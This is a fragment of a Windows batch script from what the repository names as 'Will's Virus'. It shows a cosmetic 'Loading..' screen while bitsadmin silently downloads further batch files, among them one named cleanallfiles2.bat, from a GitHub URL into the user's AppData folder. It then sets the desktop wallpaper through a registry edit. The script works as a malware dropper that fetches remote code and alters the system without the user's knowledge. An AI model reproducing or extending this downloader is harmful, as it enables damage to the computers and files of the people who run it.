...
if not exist "%appdata%\willishot\cleanallfiles2.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/cleanallfiles2.bat" "%appdata%\willishot\cleanallfiles2.bat" >nul
ping localhost -n 1 >nul
cls
echo Loading..
...
cls
echo Loading..
if not exist "%appdata%\gdi.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/gdi.bat" "%appdata%\willishot\gdi.bat" >nul
ping localhost -n 1 >nul
cls
echo Loading...
...
timeout 4 >nul
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%appdata%\willishot\wallpaper.bmp" /f >nul
